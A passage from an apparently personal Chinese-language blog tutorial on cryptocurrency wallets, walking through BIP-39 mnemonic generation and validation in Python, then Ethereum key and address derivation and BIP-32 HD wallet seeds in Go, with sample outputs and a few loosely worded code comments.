class="hljs-built_in">bin</span>(hash_bytes[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[:<span class="hljs-number">4</span>]<br><span class="hljs-built_in">print</span>(checksum_bits) <span class="hljs-comment"># 0111</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1.3.组合熵和校验</span><br><span class="hljs-string">将校验和附加到熵的末尾，形成一个新的二进制序列。这个序列的总长度为 (熵的长度 + 校验和的长度)。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># 这里bin(byte)后的[2:]是切掉0b开头，zfill(8)是填充，如果长度没有8位就填充0</span><br>entropy_bits = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">bin</span>(byte)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>                       <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> entropy])  <span class="hljs-comment"># 这一步是生成校验和</span><br><span class="hljs-built_in">print</span>(entropy_bits) <span class="hljs-comment"># 一堆0101</span><br><span class="hljs-comment"># 把校验和拼接到熵的末尾</span><br>combined_bits = entropy_bits + checksum_bits<br><span class="hljs-built_in">print</span>(combined_bits) <span class="hljs-comment"># 一堆0101</span><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1.4 分割为助记词索引，等下去助记词库里面那助记词</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># range(0, len(combined_bits), 11)创建一个迭代范围，从0开始，每次增加11，直到达到combined_bits的长度之前的最大值。</span><br><span class="hljs-comment"># combined_bits[i:i + 11]是对combined_bits进行切片，从索引i开始，切片长度为11，得到一个11位的二进制字符串。</span><br><span class="hljs-comment"># int(combined_bits[i:i + 11], 2)将切片得到的二进制字符串作为参数传递给int()函数，并指定进制为2，将二进制字符串转换为对应的整数值。</span><br>indices = [<span class="hljs-built_in">int</span>(combined_bits[i:i + <span class="hljs-number">11</span>], <span class="hljs-number">2</span>)<br>           <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(combined_bits), <span class="hljs-number">11</span>)] <span class="hljs-comment"># 11是步长，[i:i+11]表示往后面取11位</span><br><span class="hljs-built_in">print</span>(indices)  <span class="hljs-comment"># 这是一个列表，里面有12个数字索引，</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1.5 映射为助记词，就是通过上面的索引列表去助记词库里面拿到对应的助记词</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>wordlist = bip39.INDEX_TO_WORD_TABLE  <span class="hljs-comment"># bip39.INDEX_TO_WORD_TABLE 返回出来的是2048个助记词单词组成的元组</span><br><br>mnemonic = <span class="hljs-string">&#x27; &#x27;</span>.join(wordlist[index] <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indices)<br><span class="hljs-built_in">print</span>(mnemonic)<br></code></pre></td></tr></table></figure><h1 id="二-助记词验证过程"><a href="#二-助记词验证过程" class="headerlink" title="二. 助记词验证过程"></a>二. 助记词验证过程</h1><h2 id="2-1-助记词验证原理-或-流程"><a href="#2-1-助记词验证原理-或-流程" class="headerlink" title="2.1 助记词验证原理 或 流程"></a>2.1 助记词验证原理 或 流程</h2><h3 id="2-1-1-检查单词数量"><a href="#2-1-1-检查单词数量" class="headerlink" title="2.1.1 检查单词数量"></a>2.1.1 检查单词数量</h3><p> 第一步肯定是检查单词数量，因为助记词的单词数量通常是 12、15、18、21 或 24 个单词。如果不是，则不在这些范围内。</p><h3 id="2-2-2-检查单词是否在词表中"><a href="#2-2-2-检查单词是否在词表中" class="headerlink" title="2.2.2 检查单词是否在词表中"></a>2.2.2 检查单词是否在词表中</h3><p>第二步是检查单词是否都在bip39的2048个单词的词汇表中，如果不是则错</p><h3 id="2-2-3-将助记词转化为位串"><a href="#2-2-3-将助记词转化为位串" class="headerlink" title="2.2.3 将助记词转化为位串"></a>2.2.3 将助记词转化为位串</h3><p>将每个助记词的单词转换成它在bip39词汇表中对应的索引位，每个索引都表示一个11位的二进制数（0101码）</p><p>将所有的二进制数连接起来形成一个位串</p><h3 id="2-2-4-提取种子和校验和"><a href="#2-2-4-提取种子和校验和" class="headerlink" title="2.2.4 提取种子和校验和"></a>2.2.4 提取种子和校验和</h3><p>位串的长度应该是助记词单词数乘以11，例如12个单词的助记词对应的位串长度为132位，位串的前128位是种子，后4为是校验和。</p><h3 id="2-2-5-计算校验和"><a href="#2-2-5-计算校验和" class="headerlink" title="2.2.5 计算校验和"></a>2.2.5 计算校验和</h3><p>将种子通过SHA-256哈希函数计算处一个哈希值，然后取哈希值的前4位作为计算得到的校验和。</p><h3 id="2-2-6-验证校验和"><a href="#2-2-6-验证校验和" class="headerlink" title="2.2.6 验证校验和"></a>2.2.6 验证校验和</h3><p>比较提取的校验和 和 计算得到的校验和。如果两者匹配，则助记词有效，否则无效</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bip39<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_mnemonic</span>(<span class="hljs-params">mnemonic, wordlist</span>):<br>    words = mnemonic.split()<br>    <br>    <span class="hljs-comment"># 检查单词数量</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(words) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-comment"># 检查单词是否在词汇表中</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> wordlist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-comment"># 将助记词转化成位串</span><br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>        index = wordlist.index(word)<br>        binary_string += <span class="hljs-built_in">format</span>(index, <span class="hljs-string">&#x27;011b&#x27;</span>) <span class="hljs-comment"># format(index, &#x27;011b&#x27;) 的含义是将 index 格式化为 11 位的二进制字符串，不足 11 位的部分在前面用零填充。</span><br>    <span class="hljs-built_in">print</span>(binary_string)<br>    <span class="hljs-comment"># 提取种子和校验和</span><br>    <span class="hljs-comment"># 计算种子部分的长度。根据给定的单词列表 words 的长度，每个单词占用 11 位的二进制字符串，除以 3 取整数部分表示校验和的长度。通过减去校验和的长度，得到种子部分的长度。</span><br>    seed_bits_length = (<span class="hljs-built_in">len</span>(words) * <span class="hljs-number">11</span>) - (<span class="hljs-built_in">len</span>(words) // <span class="hljs-number">3</span>) <span class="hljs-comment"># </span><br>    <span class="hljs-comment"># 从 binary_string 中提取种子部分。使用切片操作 [:seed_bits_length]，获取从开头到种子部分长度的子字符串。</span><br>    seed_bits = binary_string[:seed_bits_length]<br>    <span class="hljs-comment"># 从 binary_string 中提取校验和部分。使用切片操作 [seed_bits_length:]，获取从种子部分长度开始到末尾的子字符串。</span><br>    checksum_bits = binary_string[seed_bits_length:]<br>    <br>    <br>    <span class="hljs-comment"># 计算校验和</span><br>    <span class="hljs-keyword">import</span> hashlib<br>    <span class="hljs-comment"># 将种子部分的二进制字符串 seed_bits 转换为字节串。</span><br>    <span class="hljs-comment"># 首先，使用 int(seed_bits, 2) 将二进制字符串转换为整数。</span><br>    <span class="hljs-comment"># 然后，使用 to_bytes(len(seed_bits) // 8, byteorder=&#x27;big&#x27;) 将整数转换为字节串，</span><br>    <span class="hljs-comment"># 其中 len(seed_bits) // 8 表示字节串的长度，byteorder=&#x27;big&#x27; 表示使用大端字节序。</span><br>    seed_bytes = <span class="hljs-built_in">int</span>(seed_bits, <span class="hljs-number">2</span>).to_bytes(<span class="hljs-built_in">len</span>(seed_bits) // <span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-comment"># 对种子字节串 seed_bytes 进行 SHA-256 哈希计算，并获取哈希结果的十六进制表示。</span><br>    <span class="hljs-comment"># 使用 hashlib.sha256() 创建 SHA-256 哈希算法对象，然后调用 .hexdigest() 方法获取哈希结果的十六进制字符串表示。</span><br>    hash_value = hashlib.sha256(seed_bytes).hexdigest()<br>    <span class="hljs-comment"># 将哈希结果的十六进制字符串 hash_value 转换为 256 位的二进制字符串。</span><br>    <span class="hljs-comment"># 首先，使用 int(hash_value, 16) 将十六进制字符串转换为整数。</span><br>    <span class="hljs-comment"># 然后，使用 bin() 将整数转换为二进制字符串，去掉开头的 &#x27;0b&#x27;，并使用 zfill(256) 在前面填充零，使其长度达到 256 位。</span><br>    hash_bits = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(hash_value, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)<br>    <span class="hljs-comment"># 提取校验和部分。使用切片操作 [:len(words) // 3]，获取从二进制字符串 hash_bits 的开头到校验和长度的子字符串。校验和长度为单词列表 words 的长度除以 3。</span><br>    calculated_checksum = hash_bits[:<span class="hljs-built_in">len</span>(words) // <span class="hljs-number">3</span>]<br>    <br>    <span class="hljs-comment"># 验证校验和，判断助记词转换的位串与计算得来的校验和一致</span><br>    <span class="hljs-keyword">return</span> checksum_bits == calculated_checksum<br><br><span class="hljs-comment"># Example usage:</span><br>mnemonic = <span class="hljs-string">&quot;legal winner thank year wave sausage worth useful legal winner thank yellow&quot;</span><br>wordlist = bip39.INDEX_TO_WORD_TABLE  <span class="hljs-comment"># BIP-39 wordlist</span><br>is_valid = validate_mnemonic(mnemonic, wordlist)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Is valid mnemonic:&quot;</span>, is_valid)<br></code></pre></td></tr></table></figure><h1 id="三-编码解码过程"><a href="#三-编码解码过程" class="headerlink" title="三. 编码解码过程"></a>三. 编码解码过程</h1><h1 id="四-调用-BIP-39-词库生成助记词"><a href="#四-调用-BIP-39-词库生成助记词" class="headerlink" title="四. 调用 BIP-39 词库生成助记词"></a>四. 调用 BIP-39 词库生成助记词</h1><h2 id="4-1-代码封装"><a href="#4-1-代码封装" class="headerlink" title="4.1 代码封装"></a>4.1 代码封装</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Bip39Mnemonic</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">createMnemonic</span>(<span class="hljs-params">self, number</span>):<br>        mnemonic = bip39.get_entropy_bits(number)<br>        <span class="hljs-keyword">return</span> mnemonic<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mnemonicToEntropy</span>(<span class="hljs-params">self,  mnemonic</span>):<br>        decode_words = bip39.decode_phrase( mnemonic)<br>        <span class="hljs-keyword">return</span> decode_words<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">entropyToMnemonic</span>(<span class="hljs-params">self, entropy</span>):<br>        nemonic_entropy = bip39.encode_bytes(entropy)<br>        <span class="hljs-keyword">return</span> nemonic_entropy<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mnemonicToSeed</span>(<span class="hljs-params">self, mnemonic</span>):<br>        nemonic_to_seed = bip39.phrase_to_seed(mnemonic)<br>        <span class="hljs-keyword">return</span> nemonic_to_seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validateMnemonic</span>(<span class="hljs-params">self, mnemonic</span>):<br>        <span class="hljs-keyword">return</span> bip39.check_phrase(mnemonic)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generateMnemonic</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 1. 生成 128 位随机熵 (16 字节)</span><br>        entropy = os.urandom(<span class="hljs-number">16</span>)<br><br>        <span class="hljs-comment"># 2. 计算校验和 (SHA-256)</span><br>        hash_bytes = hashlib.sha256(entropy).digest()<br>        checksum_bits = <span class="hljs-built_in">bin</span>(hash_bytes[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)[:<span class="hljs-number">4</span>]  <span class="hljs-comment"># 取前 4 位</span><br><br>        <span class="hljs-comment"># 3. 组合熵和校验和</span><br>        entropy_bits = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">bin</span>(byte)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> entropy])<br>        combined_bits = entropy_bits + checksum_bits<br><br>        <span class="hljs-comment"># 4. 分割为助记词索引</span><br>        indices = [<span class="hljs-built_in">int</span>(combined_bits[i:i + <span class="hljs-number">11</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(combined_bits), <span class="hljs-number">11</span>)]<br><br>        <span class="hljs-comment"># 5. 映射为助记词</span><br>        wordlist = bip39.INDEX_TO_WORD_TABLE<br>        mnemonic = <span class="hljs-string">&#x27; &#x27;</span>.join([wordlist[index] <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indices])<br><br>        <span class="hljs-keyword">return</span> mnemonic<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bip<br><br><span class="hljs-keyword">import</span> bip<br><br>bip39_mnemonic = bip.Bip39Mnemonic()<br>mnemonic_phrase = bip39_mnemonic.generateMnemonic()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Generated mnemonic phrase: <span class="hljs-subst">&#123;mnemonic_phrase&#125;</span>&quot;</span>)<br><br>mnemonic_12_phrase = bip39_mnemonic.createMnemonic(<span class="hljs-number">12</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;create mnemonic phrase: <span class="hljs-subst">&#123;mnemonic_12_phrase&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>1、助记词生成code，加密之后存储在本地设备，</p><p>2、如果要备份或导出助记词，就要把code转成助记词</p><p>3、bip39 还可以用来验证助记词是否有效。</p><p>4、助记词变成随机种子，然后再去导出</p><p>5、生成助记词的方法</p><p>bip39–</p><h1 id="私钥对应关系"><a href="#私钥对应关系" class="headerlink" title="私钥对应关系"></a>私钥对应关系</h1><p><img src="/img/web3/privkey.png"></p><p>椭圆曲线是什么：</p><p>以太坊和比特币使用完全相同的椭圆曲线：<code>secp256k1</code>，公钥就是这个椭圆曲线上的(x, y)坐标，x，y 数值通过私钥唯一确定。</p><p>x、y 各 32 字节，故公钥为 64 字节。你可能会看到 65 字节表示的公钥，这是由 SECG 发布的行业标准的一种序列化编码方式，在最前面加一个字节的前缀，04 表示公钥为非压缩格式，即完整存储了 x 和 y 的坐标各 32 字节。</p><p>通过go语言生成私钥和公钥还有地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;crypto/elliptic&quot;</span><br>    <span class="hljs-string">&quot;crypto/rand&quot;</span><br>    <span class="hljs-string">&quot;encoding/hex&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/ethereum/go-ethereum/common&quot;</span><br>    <span class="hljs-string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span><br>    <span class="hljs-string">&quot;github.com/ethereum/go-ethereum/crypto/secp256k1&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>生成一个椭圆曲线</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">curve := secp256k1.S256()<br></code></pre></td></tr></table></figure><p>3 生成私钥（32byte）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, curve.Params().N.BitLen()/<span class="hljs-number">8</span>)<br>io.ReadFull(rand.Reader, b)<br>key := <span class="hljs-built_in">new</span>(big.Int).SetBytes(b) <span class="hljs-comment">// key就是私钥</span><br><br><span class="hljs-comment">// 打印私钥</span><br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, <span class="hljs-built_in">len</span>(key.Bytes()))<br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, hex.EncodeToString(key.Bytes()))<br></code></pre></td></tr></table></figure><p>4 生成公钥：对私钥进行椭圆曲线加密，生成公钥(64byte)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">X, Y := curve.ScalarBaseMult(key.Bytes())<br>pubKey := elliptic.Marshal(curve, X, Y)<br><br>fmt.Println(<span class="hljs-string">&quot;pubKey:&quot;</span>, pubKey)<br><br></code></pre></td></tr></table></figure><p>5 生成地址：去掉公钥第一个字节04，再使用keccak256算法压缩公钥，最后的20byte就是地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">compressPubKey := crypto.Keccak256(pubKey[<span class="hljs-number">1</span>:])<br>addr := common.BytesToAddress(compressPubKey[<span class="hljs-number">12</span>:])<br>fmt.Println(<span class="hljs-string">&quot;addr:&quot;</span>, addr.String())<br></code></pre></td></tr></table></figure><p>6 验证私钥和地址匹配</p><p>将第 3 步产生的私钥导入 metamask<br>查看 metamask 生成的地址，和第 5 步计算出的地址是否匹配</p><p>以太坊钱包有2种</p><p>1 非确定性钱包，也叫随机钱包，每个账户通过独立的随机数生成器创建，使用keystore管理账户，没有助记词，这里不详细介绍，参考链接<a href="https://www.learnblockchain.cn/article/7070">https://www.learnblockchain.cn/article/7070</a></p><p>2 分层确定性钱包，也叫<strong>HD Wallet</strong>，每个账户通过固定的种子(seed)派生，使用<code>助记词</code>管理所有账户。【行业标准了】</p><h1 id="分层确定性钱包（HD-Wallet）"><a href="#分层确定性钱包（HD-Wallet）" class="headerlink" title="分层确定性钱包（HD Wallet）"></a>分层确定性钱包（HD Wallet）</h1><p>首先看一段配置代码，看里面的几个关键信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">module.exports = &#123;<br>  networks: &#123;<br>    sepolia: &#123;<br>      url: <span class="hljs-string">&quot;...&quot;</span>,<br>      accounts: &#123;<br>        mnemonic: <span class="hljs-string">&quot;test test test test test test test test test test test junk&quot;</span>,<br>        path: <span class="hljs-string">&quot;m/44&#x27;/60&#x27;/0&#x27;/0&quot;</span>,<br>        initialIndex: <span class="hljs-number">0</span>,<br>        count: <span class="hljs-number">20</span>,<br>        passphrase: <span class="hljs-string">&quot;&quot;</span>,<br>      &#125;,<br>    &#125;,<br>  &#125;,<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>接下来3个问题：</p><p>1 <code>mnemoic</code>助记词如何能生成许多个账户地址？</p><p>2 path : “m&#x2F;44’&#x2F;60’&#x2F;0’&#x2F;0” 都是什么意思？为什么有些数字右上角还有小撇号？如何自定义配置他？</p><p>3 passphrase 是什么？ 有什么用？ 和metamask 的登录密码一样吗？</p><p>助记词</p><p>先导包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> get github.com/ethereum/<span class="hljs-keyword">go</span>-ethereum/crypto <span class="hljs-comment">// 以太坊的官方库</span><br><span class="hljs-keyword">go</span> get github.com/tyler-smith/<span class="hljs-keyword">go</span>-bip32 <span class="hljs-comment">// bip32</span><br><span class="hljs-keyword">go</span> get github.com/tyler-smith/<span class="hljs-keyword">go</span>-bip39 <span class="hljs-comment">// bip39</span><br><br></code></pre></td></tr></table></figure><p>前面讲的是BIP-39提出了助记词标准，助记词是一组相对便于记忆的单词。在BIP-39的词库里面</p><p>为什么提出助记词？是为了解决BIP-32中的种子(Seed)难于记忆和不方便备份的问题，</p><p>所以BIP-39主要包含了2个功能：由<strong>熵源生成助记词</strong>，由<strong>助记词生成种子</strong>（Seed）</p><p>所以是–&gt;BIP-39解决助记词—&gt;BIP-32 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 由熵源生成助记词</span><br><span class="hljs-comment">// @参数 128 =&gt; 12个单词</span><br><span class="hljs-comment">// @参数 256 =&gt; 24个单词</span><br>entropy, _ := bip39.NewEntropy(<span class="hljs-number">128</span>) <br>mnemonic, _ := bip39.NewMnemonic(entropy) <span class="hljs-comment">// 这里也是参考上面的流程</span><br><span class="hljs-comment">// 这两行代码的原理可以参考上面的代码的流程： 熵-&gt;校验和-&gt;去头去尾拿索引-&gt;根据索引到词库拿词</span><br>fmt.Println(<span class="hljs-string">&quot;助记词：&quot;</span>, mnemonic)<br><br><span class="hljs-comment">// 由助记词生成种子(Seed)</span><br>seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;salt&quot;</span>) <span class="hljs-comment">// 问题在这里，</span><br><span class="hljs-comment">// 这里生成种子的方法里传了助记词和盐值进去得到种子 kaccak256压缩成32byte后取最后20byte</span><br><br></code></pre></td></tr></table></figure><p>生成seed的时候，加入盐值的目的一是增加暴力破解的难度，二是保护种子（seed），就是即使助记词被盗了，种子也是安全的。如果设置了salt，虽然多了一层保护，但是一旦忘记了，也就代表永久丢失钱包了，所以要结合实际情况去考虑</p><p>这个盐值也叫密码口令（passphrase）,开头的hardhat配置里的passphrase就是这个盐值，和metamask的登录密码完全是两个东西。</p><p>打印下上面的代码得到的输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">助记词： alarm misery master column coach connect tower govern view then hint author<br>seed [<span class="hljs-number">173</span> <span class="hljs-number">84</span> <span class="hljs-number">238</span> <span class="hljs-number">141</span> <span class="hljs-number">106</span> <span class="hljs-number">78</span> <span class="hljs-number">98</span> <span class="hljs-number">62</span> <span class="hljs-number">46</span> <span class="hljs-number">6</span> <span class="hljs-number">144</span> <span class="hljs-number">59</span> <span class="hljs-number">166</span> <span class="hljs-number">101</span> <span class="hljs-number">230</span> <span class="hljs-number">76</span> <span class="hljs-number">224</span> <span class="hljs-number">82</span> <span class="hljs-number">219</span> <span class="hljs-number">27</span> <span class="hljs-number">19</span> <span class="hljs-number">172</span> <span class="hljs-number">10</span> <span class="hljs-number">148</span> <span class="hljs-number">144</span> <span class="hljs-number">31</span> <span class="hljs-number">24</span> <span class="hljs-number">47</span> <span class="hljs-number">33</span> <span class="hljs-number">105</span> <span class="hljs-number">201</span> <span class="hljs-number">81</span> <span class="hljs-number">182</span> <span class="hljs-number">186</span> <span class="hljs-number">46</span> <span class="hljs-number">36</span> <span class="hljs-number">235</span> <span class="hljs-number">51</span> <span class="hljs-number">91</span> <span class="hljs-number">224</span> <span class="hljs-number">123</span> <span class="hljs-number">175</span> <span class="hljs-number">170</span> <span class="hljs-number">170</span> <span class="hljs-number">111</span> <span class="hljs-number">161</span> <span class="hljs-number">117</span> <span class="hljs-number">98</span> <span class="hljs-number">60</span> <span class="hljs-number">214</span> <span class="hljs-number">91</span> <span class="hljs-number">14</span> <span class="hljs-number">204</span> <span class="hljs-number">120</span> <span class="hljs-number">213</span> <span class="hljs-number">42</span> <span class="hljs-number">250</span> <span class="hljs-number">251</span> <span class="hljs-number">126</span> <span class="hljs-number">131</span> <span class="hljs-number">85</span> <span class="hljs-number">160</span> <span class="hljs-number">213</span> <span class="hljs-number">150</span>]<br><span class="hljs-keyword">type</span>: []<span class="hljs-type">uint8</span><br><br></code></pre></td></tr></table></figure><p>可以发现：助记词是12个单词的，而Seed是一堆的字符，肯定是助记词更方便备份和恢复钱包</p><h1 id="分层确定性钱包（HD-Wallet）的基本原理"><a href="#分层确定性钱包（HD-Wallet）的基本原理" class="headerlink" title="分层确定性钱包（HD Wallet）的基本原理"></a>分层确定性钱包（HD Wallet）的基本原理</h1><p>现在我们用种子生产主账户私钥，这里注意，这里的私钥还不能直接导入，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go">masterKey, _ := bip32.NewMasterKey(seed)<br>fmt.Println(<span class="hljs-string">&quot;masterKey:&quot;</span>, masterKey)<br><span class="hljs-comment">// masterKey: xprv9s21ZrQH143K4LW9szNE7QXNJkpPfFSL8k6CM9zsUb1N3czQhVFUXrZqYox2UDbgS96NrsDL2EwUzS9J6N6PfN4P3d3HNYqge6LYRQVWN6M</span><br><br><span class="hljs-comment">// 可以看下NewMasterKey的内部实现和返回内容</span><br><span class="hljs-comment">// NewMasterKey creates a new master extended key from a seed</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewMasterKey</span><span class="hljs-params">(seed []<span 